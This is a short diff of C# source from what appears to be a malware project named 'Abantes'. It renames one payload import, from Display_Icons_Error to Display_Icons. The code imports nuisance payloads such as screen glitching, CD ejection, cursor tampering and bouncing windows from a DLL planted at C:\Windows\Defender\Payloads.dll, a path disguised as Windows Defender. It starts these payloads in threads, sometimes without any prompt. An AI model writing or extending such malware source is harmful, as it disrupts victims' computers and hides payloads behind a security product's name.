@@ -34,8 +34,8 @@ namespace Abantes.Payloads
         public static extern void Screen_Glitching();
         [DllImport(@"C:\Windows\Defender\Payloads.dll", CharSet = CharSet.Unicode, EntryPoint = "?EjectCD@Payloads@1@QAEXXZ")]
         public static extern void EjectCd();
-        [DllImport(@"C:\Windows\Defender\Payloads.dll", CharSet = CharSet.Unicode, EntryPoint = "?Display_Icons_Error@Payloads@1@QAEXXZ")]
-        public static extern void Display_Icons_Error();
+        [DllImport(@"C:\Windows\Defender\Payloads.dll", CharSet = CharSet.Unicode, EntryPoint = "?Display_Icons@Payloads@1@QAEXXZ")]
+        public static extern void Display_Icons();
         [DllImport(@"C:\Windows\Defender\Payloads.dll", CharSet = CharSet.Unicode, EntryPoint = "?CursorIcon@Payloads@1@QAEXXZ")]
         public static extern void CursorIcon();
         [DllImport(@"C:\Windows\Defender\Payloads.dll", CharSet = CharSet.Unicode, EntryPoint = "?CrazyBounce@Payloads@1@QAEXXZ")]
@@ -382,13 +382,13 @@ namespace Abantes.Payloads
                         {
                             if (MessageBox.Show("START HELP ICONS ON SCREEN PAYLOAD", "DEBUG", MessageBoxButtons.YesNo) == DialogResult.Yes)
                             {
-                                Thread helpicons = new Thread(new ThreadStart(Annoying.Display_Icons_Error));
+                                Thread helpicons = new Thread(new ThreadStart(Annoying.Display_Icons));
                                 helpicons.Start();
                             }
                         }
                         else
                         {
-                            Thread helpicons = new Thread(new ThreadStart(Annoying.Display_Icons_Error));
+                            Thread helpicons = new Thread(new ThreadStart(Annoying.Display_Icons));
                             helpicons.Start();
                         }
                         break;
